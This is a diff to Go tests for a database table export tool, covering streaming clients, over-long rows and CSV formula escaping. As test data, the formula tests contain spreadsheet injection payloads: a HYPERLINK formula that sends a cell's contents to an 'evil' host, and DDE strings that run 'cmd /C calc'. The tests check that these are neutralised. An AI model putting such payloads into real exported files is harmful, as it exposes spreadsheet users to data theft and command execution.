@@ -1,6 +1,7 @@
 package dataview
 
 import (
+	"bufio"
 	"bytes"
 	"context"
 	"errors"
@@ -8,6 +9,7 @@ import (
 	"io"
 	"strings"
 	"testing"
+	"time"
 
 	"github.com/Caria-Core/zelie/internal/msg"
 )
@@ -19,11 +21,13 @@ type fake struct {
 	stderr        string
 	code          uint32
 	sent          []string
+	clients       [][]string
 }
 
 func (f *fake) exec(_ context.Context, args []string, stdin io.Reader, stdout, stderr io.Writer) (uint32, error) {
 	b, _ := io.ReadAll(stdin)
 	f.sent = append(f.sent, string(b))
+	f.clients = append(f.clients, args)
 	out := f.rows
 	if strings.Contains(string(b), "'t', ") {
 		out = f.catalog
@@ -205,5 +209,96 @@ func TestExport(t *testing.T) {
 	if !strings.Contains(f.sent[1], `SELECT json_build_array("id"::text, "note"::text, "blob"::text) FROM "public"."orders" ORDER BY "id";`) ||
 		!strings.Contains(f.sent[1], "statement_timeout = 600000") {
 		t.Errorf("export sql: %s", f.sent[1])
+	}
+}
+
+// The clients print rows as they get them. Otherwise an export holds the
+// whole table in the database's container, which has a memory limit.
+func TestClientsStream(t *testing.T) {
+	for engine, cat := range map[string][]string{"postgres": pgCatalog, "mariadb": myCatalog} {
+		f := &fake{catalog: cat}
+		schema, table := "public", "orders"
+		if engine == "mariadb" {
+			schema, table = "app", "users"
+		}
+		if err := Export(context.Background(), f.exec, engine, Query{Schema: schema, Table: table}, io.Discard); err != nil {
+			t.Fatal(err)
+		}
+		cmd := strings.Join(f.clients[len(f.clients)-1], " ")
+		if want := map[string]string{"postgres": "-v FETCH_COUNT=1000", "mariadb": "mariadb --quick "}[engine]; !strings.Contains(cmd, want) {
+			t.Errorf("%s runs %q", engine, cmd)
+		}
+	}
+}
+
+// A row too long to read stops the client at once. It would otherwise sit
+// on a full pipe until the deadline.
+func TestExportRowTooLong(t *testing.T) {
+	f := &fake{catalog: pgCatalog}
+	hang := func(ctx context.Context, args []string, stdin io.Reader, stdout, stderr io.Writer) (uint32, error) {
+		if _, err := f.exec(ctx, args, stdin, stdout, stderr); err != nil || len(f.sent) == 1 {
+			return 0, err
+		}
+		chunk := bytes.Repeat([]byte("x"), 1<<20)
+		for range maxRow>>20 + 1 {
+			if _, err := stdout.Write(chunk); err != nil {
+				break
+			}
+		}
+		<-ctx.Done()
+		return 0, ctx.Err()
+	}
+	// A hung client would otherwise take ten minutes to give up.
+	ctx, cancel := context.WithTimeout(context.Background(), 20*time.Second)
+	defer cancel()
+	var out bytes.Buffer
+	start := time.Now()
+	err := Export(ctx, hang, "postgres", Query{Schema: "public", Table: "orders"}, &out)
+	if !errors.Is(err, bufio.ErrTooLong) || !strings.Contains(err.Error(), "a row is longer than 64 MB") {
+		t.Fatalf("err = %v", err)
+	}
+	if took := time.Since(start); took > 10*time.Second {
+		t.Errorf("took %v to give up", took)
+	}
+	if !strings.HasPrefix(out.String(), "id,note,blob\n") {
+		t.Errorf("wrote %q", out.String())
+	}
+}
+
+func TestFormulaSafe(t *testing.T) {
+	for in, want := range map[string]string{
+		`=HYPERLINK("https://evil/?d="&B2,"Open")`: `'=HYPERLINK("https://evil/?d="&B2,"Open")`,
+		`@SUM(A1:A9)`:            `'@SUM(A1:A9)`,
+		`+cmd|' /C calc'!A0`:     `'+cmd|' /C calc'!A0`,
+		`-2+3+cmd|' /C calc'!A0`: `'-2+3+cmd|' /C calc'!A0`,
+		"\t=1+1":                 "'\t=1+1",
+		"\r=1+1":                 "'\r=1+1",
+		"+49 30 1234":            "'+49 30 1234",
+		"-":                      "'-",
+		// Text and numbers are left alone.
+		"plain": "plain", "a=b": "a=b", "": "",
+		"-5": "-5", "+4930123": "+4930123", "-1.5e-3": "-1.5e-3", "42": "42",
+	} {
+		if got := formulaSafe(in); got != want {
+			t.Errorf("%q became %q, want %q", in, got, want)
+		}
+	}
+}
+
+// What an app puts in its tables, and the names it gives its columns, are
+// not formulas in the file.
+func TestExportFormulas(t *testing.T) {
+	catalog := []string{
+		`["t", "public", "t", false, 1, 0]`,
+		`["c", "public", "t", "=evil()", "text", true, false, false]`,
+		`["c", "public", "t", "n", "integer", true, false, false]`,
+	}
+	f := &fake{catalog: catalog, rows: []string{`["=HYPERLINK(\"https://evil\")", "-7"]`}}
+	var out bytes.Buffer
+	if err := Export(context.Background(), f.exec, "postgres", Query{Schema: "public", Table: "t"}, &out); err != nil {
+		t.Fatal(err)
+	}
+	if want := "'=evil(),n\n\"'=HYPERLINK(\"\"https://evil\"\")\",-7\n"; out.String() != want {
+		t.Errorf("got %q, want %q", out.String(), want)
 	}
 }
